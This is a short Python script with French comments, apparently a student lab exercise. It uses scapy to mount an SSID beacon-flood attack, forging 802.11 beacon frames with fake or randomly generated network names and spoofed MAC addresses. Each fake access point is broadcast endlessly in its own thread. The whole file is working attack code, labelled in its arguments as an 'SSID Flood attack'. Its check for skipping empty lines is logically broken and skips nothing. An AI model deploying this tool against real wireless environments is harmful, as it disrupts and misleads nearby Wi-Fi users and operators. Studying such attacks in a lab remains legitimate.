# Description : Script permettant de créer de faux SSID afin de créer du traffic. 
#               Afin de fonctionner proprement, il faut fournir un fichier contenant les SSID à créer
# Authors     : Géraud SILVESTI, Alexandre JAQUIER, Francesco MONTI
# Date        : 28.03.2023
# Usage       : 2_fakechannel.py

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from threading import Thread
from faker import Faker
import argparse

ssid_list = []

# Param nécessaire (à remplir) permettant de lancer l'attaque
parser = argparse.ArgumentParser(prog="SSID FLOOD", description="SSID Flood attack")

parser.add_argument("-i", "--Interface", required=True, help="Interface who send attack")
parser.add_argument("-f", "--File", required=False, help="file with all SSID or Number of SSID to generate (not null and positive)")
args = parser.parse_args()

interface = args.Interface
try:
    file = int(args.File)
except ValueError:
    file = args.File


# Génére et envoi de paquets afin de simuler un AP avec SSID et une fausse MAC adresse
def generate_send_beacon(ssid, mac, infinite=True):
    # Forge le paquet avec dot11, le beacon et le SSID
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) 
    beacon = Dot11Beacon(cap="ESS+privacy") 
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) 
    packet = RadioTap()/dot11/beacon/essid
    sendp(packet, inter=0.1, loop=1, iface=interface, verbose=0)


# Generation de SSID si aucun fichier n'est fourni en paramètre
if type(file) == int:
    for i in range(file):
        ssid_list.append(Faker().name())
# Autrement on prend la liste fournie
else :
    file = open(file, "r")
    for line in file:
        # Evite de prendre des SSID avec un nom vide
        if line != "\r\n" or line != "" or line != "\n":
            ssid_list.append(line.rstrip())

# On démarre un thread pour chaque AP crée afin d'envoyer des paquets
for ssid_name in ssid_list:
    print(ssid_name)
    Thread(target=generate_send_beacon, args=(ssid_name, Faker().mac_address())).start()